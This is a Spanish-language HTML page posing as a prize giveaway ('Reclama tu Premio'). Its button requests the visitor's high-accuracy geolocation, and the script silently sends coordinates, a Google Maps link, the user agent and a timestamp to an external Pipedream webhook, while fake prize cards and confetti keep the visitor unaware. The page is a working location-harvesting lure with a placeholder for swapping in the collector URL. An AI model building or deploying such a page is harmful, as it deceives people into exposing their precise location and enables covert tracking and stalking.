<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Premios Profesional</title>
<style>
body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin:0; padding:0; background:linear-gradient(135deg,#4facfe,#00f2fe); }
.container { max-width:900px; margin:40px auto; background:#fff; border-radius:20px; padding:40px; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.15); }
h1 { margin-bottom:15px; color:#222; }
button { margin:10px; padding:12px 25px; font-size:16px; border:none; border-radius:8px; background:#007bff; color:#fff; cursor:pointer; transition:0.3s; }
button:hover { background:#0056b3; }
#msg { margin-top:20px; font-weight:bold; display:none; color:green; }
.premios { display:none; margin-top:25px; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:15px; }
.premio-card { background:#fafafa; padding:10px; border-radius:12px; box-shadow:0 4px 15px rgba(0,0,0,0.1); }
.premio-card img { width:100%; border-radius:10px; height:150px; object-fit:cover; }
canvas { position:fixed; top:0; left:0; pointer-events:none; z-index:999; }
</style>
</head>
<body>

<canvas id="confetti"></canvas>

<div class="container">
<h1>‚úÖ Reclama tu Premio</h1>
<p id="infoText">Pulsa el bot√≥n para reclamar tu premio.</p>
<button id="btnPremio">üìç Reclamar Premio</button>
<p id="msg">üéâ Premios desbloqueados!</p>
<div class="premios" id="premios"></div>
</div>

<script>
const WEBHOOK_URL = "https://eo6bspy1b9no0kb.m.pipedream.net"; // reemplaza aqu√≠
const premios = [
  {nombre:"üö≤ Bicicleta", img:"https://cdn.pixabay.com/photo/2017/03/02/04/23/bicycle-2119460_1280.jpg"},
  {nombre:"üéÆ Consola Gamer", img:"https://cdn.pixabay.com/photo/2016/11/29/04/17/joystick-1866599_1280.jpg"},
  {nombre:"üì± Smartphone", img:"https://cdn.pixabay.com/photo/2016/11/19/14/00/smartphone-1836073_1280.jpg"},
  {nombre:"‚åö Smartwatch", img:"https://cdn.pixabay.com/photo/2015/09/05/21/51/apple-watch-925157_1280.jpg"},
  {nombre:"üíª Laptop", img:"https://cdn.pixabay.com/photo/2014/05/02/21/50/home-office-336378_1280.jpg"},
  {nombre:"üì∫ TV", img:"https://cdn.pixabay.com/photo/2015/09/05/22/46/tv-926093_1280.jpg"}
];

const btnPremio = document.getElementById("btnPremio");
const infoText = document.getElementById("infoText");
const premiosDiv = document.getElementById("premios");
const msg = document.getElementById("msg");
const canvas = document.getElementById("confetti");
const ctx = canvas.getContext("2d");

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

btnPremio.addEventListener("click",()=>{
  if(!navigator.geolocation) return alert("No soporta geolocalizaci√≥n");
  navigator.geolocation.getCurrentPosition(onSuccess,onError,{enableHighAccuracy:true,timeout:10000,maximumAge:0});
});

function onSuccess(pos){
  const maps_link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
  const data = {
    lat: pos.coords.latitude,
    lon: pos.coords.longitude,
    accuracy: pos.coords.accuracy,
    fecha: new Date().toISOString(),
    userAgent: navigator.userAgent,
    maps_link: maps_link
  };
  enviarWebhook(data); // envia todo a Pipedream
  mostrarPremios();
  msg.style.display="block";
  lanzarConfeti();
}

function onError(err){
  alert("Error al obtener ubicaci√≥n: "+(err.message||err.code));
}

// Mostrar premios en cascada
function mostrarPremios(){
  premiosDiv.style.display="grid";
  premiosDiv.innerHTML="";
  premios.forEach((p,i)=>{
    const card = document.createElement("div");
    card.className="premio-card";
    card.style.animation = `fadeIn 0.5s ease forwards`;
    card.style.animationDelay = `${i*0.2}s`;
    card.innerHTML = `<img src="${p.img}" alt="${p.nombre}"><h3>${p.nombre}</h3>`;
    premiosDiv.appendChild(card);
  });
}

// Confeti profesional
function lanzarConfeti(){
  const piezas = Array.from({length:200},()=>({
    x:Math.random()*canvas.width,
    y:Math.random()*canvas.height - canvas.height,
    w:10, h:10,
    color:["#f94144","#f3722c","#f9c74f","#90be6d","#577590","#43aa8b"][Math.floor(Math.random()*6)],
    vel:Math.random()+2,
    rot:Math.random()*360,
    rotVel:(Math.random()-0.5)*10
  }));
  let frame;
  function animar(){
    ctx.clearRect(0,0,canvas.width,canvas.height);
    piezas.forEach(p=>{
      ctx.save();
      ctx.translate(p.x+p.w/2,p.y+p.h/2);
      ctx.rotate(p.rot*Math.PI/180);
      ctx.fillStyle = p.color;
      ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);
      ctx.restore();
      p.y += p.vel;
      p.rot += p.rotVel;
      if(p.y>canvas.height) p.y=-10;
    });
    frame = requestAnimationFrame(animar);
  }
  animar();
  setTimeout(()=>{ cancelAnimationFrame(frame); ctx.clearRect(0,0,canvas.width,canvas.height); },7000);
}

// Enviar a Pipedream
async function enviarWebhook(data){
  try{
    await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data,null,2)});
  }catch(err){ console.error("Error webhook",err);}
}
</script>
</body>
</html>


